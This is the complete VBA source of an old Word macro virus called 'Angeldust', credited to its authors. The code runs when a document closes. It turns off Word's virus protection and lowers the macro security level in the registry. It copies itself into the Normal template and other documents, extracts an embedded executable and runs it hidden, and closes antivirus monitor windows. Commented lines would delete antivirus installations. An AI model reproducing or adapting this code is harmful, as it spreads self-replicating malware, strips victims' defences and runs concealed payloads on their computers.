Attribute VB_Name = "Angeldust"
' Virus Name : Angeldust
' Virus Author : Necronomikon/ZeroGravity


Sub AutoClose()
On Error Resume Next
    Call KillAV
    Call Infection
End Sub
Sub Infection()
On Error Resume Next
With Options
    .ConfirmConversions = (Rnd * 0)
    .VirusProtection = (Rnd * 0)
    .SaveNormalPrompt = (Rnd * 0)
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    CommandBars("Macro").Controls("Security...").Enabled = False
End Select
WordBasic.DisableAutoMacros 0
Application.DisplayStatusBar = False
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
Set NT = NormalTemplate.VBProject.VBComponents
Set AD = ActiveDocument.VBProject.VBComponents
Copyme = "C:\Angeldust.sys"
If NT.Item("Angeldust").Name <> "Angeldust" Then
    AD("Angeldust").Export Copyme
    NT.Import Copyme
End If
If AD.Item("Angeldust").Name <> "Angeldust" Then
    NT("Angeldust").Export Copyme
    AD.Import Copyme
    ActiveDocument.Save
End If
Kill Copyme
Call Dropper
End Sub
Sub Dropper()
On Error Resume Next
Dim angel() As Byte

a = Application.ActiveDocument.Path
b = Application.ActiveDocument.Name
c = a + "\" + b

 Open c For Binary Access Read As #1
 ReDim angel(94208)
 Get #1, 19968, angel
 Close #1

 Open "C:\angeldust.exe" For Binary Access Write As #1
 Put #1, , angel
 Close #1

 w = Shell("C:\angeldust.exe", vbHide)
End Sub
Sub ToolsMacro()
On Error Resume Next
End Sub
Sub FileTemplates()
On Error Resume Next
End Sub
Sub ViewVBCode()
On Error Resume Next
End Sub
Sub KillAV()
On Error Resume Next
'its better to close av-monitors instead of deleting its files!!!
For I = 1 to Tasks.Count
If ( Tasks.Item(I).Name = "AVP Monitor" ) Then Tasks.Item(I).Close 'window title(AVP)
If ( Tasks.Item(I).Name = "IKARUS Guard9x" ) Then Tasks.Item(I).Close 'Ikarus av
If ( Tasks.Item(I).Name = "MCAfee VShield" ) Then Tasks.Item(I).Close 'McAfee
If ( Tasks.Item(I).Name = "CLAW95" ) Then Tasks.Item(I).Close 'Norman Virus Control
If ( Tasks.Item(I).Name = "SCAN32" ) Then Tasks.Item(I).Close 'DR-Solomon
If ( Tasks.Item(I).Name = "FP-WIN" ) Then Tasks.Item(I).Close 'F-Prot
If ( Tasks.Item(I).Name = "VET95" ) Then Tasks.Item(I).Close 'InnoculateIT
If ( Tasks.Item(I).Name = "NAVAPW32" ) Then Tasks.Item(I).Close 'Norton
If ( Tasks.Item(I).Name = "SWEEP95" ) Then Tasks.Item(I).Close 'Sophos 
If ( Tasks.Item(I).Name = "IOMON98" ) Then Tasks.Item(I).Close 'PC-Cillin
If ( Tasks.Item(I).Name = "MONITOR" ) Then Tasks.Item(I).Close 'RAV
Next 
'Anti-AV from NTVCK
'Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
'Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
'Kill "C:\Progra~1\FindVirus\*.*"
'Kill "C:\Toolkit\FindVirus\*.*"
'Kill "C:\Progra~1\Quick Heal\*.*"
'Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
'Kill "C:\Progra~1\Norton AntiVirus\*.*"
'Kill "C:\TBAVW95\*.*"
'Kill "C:\VS95\*.*"
'Kill "C:\eSafe\Protect\*.*"
'Kill "C:\PC-Cillin 95\*.*"
'Kill "C:\PC-Cillin 97\*.*"
'Kill "C:\f-macro\*.*"
'Kill "C:\Progra~1\FWIN32"
End Sub